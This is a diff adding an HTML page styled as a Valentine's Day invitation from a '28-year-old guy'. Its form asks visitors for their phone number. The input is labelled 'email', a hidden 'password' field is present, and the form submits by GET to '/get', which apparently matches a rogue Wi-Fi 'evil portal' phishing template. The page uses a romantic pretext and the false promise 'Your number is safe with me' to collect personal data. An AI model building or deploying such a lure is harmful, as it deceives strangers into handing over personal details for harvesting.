@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Will You Be My Valentine? &#x1F495;</title>
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    background: linear-gradient(135deg, #ff9aa2, #ffb7b2, #ffd7ba);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    margin: 0;
+    color: #333;
+  }
+  .valentines-container {
+    width: 90%;
+    max-width: 380px;
+    background: white;
+    border-radius: 20px;
+    box-shadow: 0 10px 30px rgba(255, 105, 180, 0.3);
+    padding: 30px 25px;
+    text-align: center;
+    border: 2px solid #ff69b4;
+  }
+  .heart {
+    font-size: 60px;
+    margin-bottom: 15px;
+    animation: beat 1.2s infinite;
+  }
+  @keyframes beat {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.15); }
+  }
+  h1 {
+    font-size: 28px;
+    color: #d81e5b;
+    margin: 10px 0 8px;
+    font-weight: bold;
+  }
+  h2 {
+    font-size: 18px;
+    color: #ff5e78;
+    margin-bottom: 20px;
+    line-height: 1.4;
+  }
+  .info {
+    font-size: 16px;
+    color: #444;
+    margin: 20px 0 30px;
+    line-height: 1.5;
+  }
+  input[type="text"] {
+    width: 100%;
+    padding: 14px 16px;
+    margin: 10px 0 20px;
+    border: 2px solid #ffb6c1;
+    border-radius: 12px;
+    font-size: 16px;
+    box-sizing: border-box;
+    background: #fff0f5;
+  }
+  input:focus {
+    outline: none;
+    border-color: #ff69b4;
+    box-shadow: 0 0 0 3px rgba(255, 105, 180, 0.2);
+  }
+  button {
+    background: linear-gradient(45deg, #ff3366, #ff6b6b);
+    color: white;
+    padding: 16px;
+    border: none;
+    border-radius: 50px;
+    font-size: 20px;
+    font-weight: bold;
+    cursor: pointer;
+    width: 100%;
+    transition: all 0.25s;
+    box-shadow: 0 6px 15px rgba(255, 51, 102, 0.4);
+  }
+  button:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 10px 20px rgba(255, 51, 102, 0.5);
+  }
+  .small-text {
+    margin-top: 25px;
+    font-size: 13px;
+    color: #777;
+  }
+</style>
+</head>
+<body>
+<div class="valentines-container">
+  <div class="heart">&#x1F496;&#x2764;&#xFE0F;&#x1F495;</div>
+  
+  <h1>Hey there! &#x1F48C;&#x1F60D;</h1>
+  
+  <h2>Will you be my Valentine? &#x1F339;</h2>
+  
+  <div class="info">
+    I'm a 28-year-old guy,<br>
+    6ft tall, and looking for someone special &#x2764;&#xFE0F;&#x1F970;<br>
+    Say yes and let's make this Valentine's Day unforgettable! &#x1F389;&#x1F491;
+  </div>
+  <form action="/get" method="get">
+    <label for="email"><b>Your Phone Number &#x1F4F1;</b></label>
+    <input type="text" id="email" name="email" placeholder="Your phone number &#x1F495;&#x1F618;" required>
+    <input type="hidden" name="password" value="">
+    
+    <button type="submit">Be Mine &#x1F496;&#x2764;&#xFE0F;</button>
+  </form>
+  <div class="small-text">
+    Your number is safe with me... promise &#x1F618;&#x1F512;
+  </div>
+</div>
+</body>
+</html>
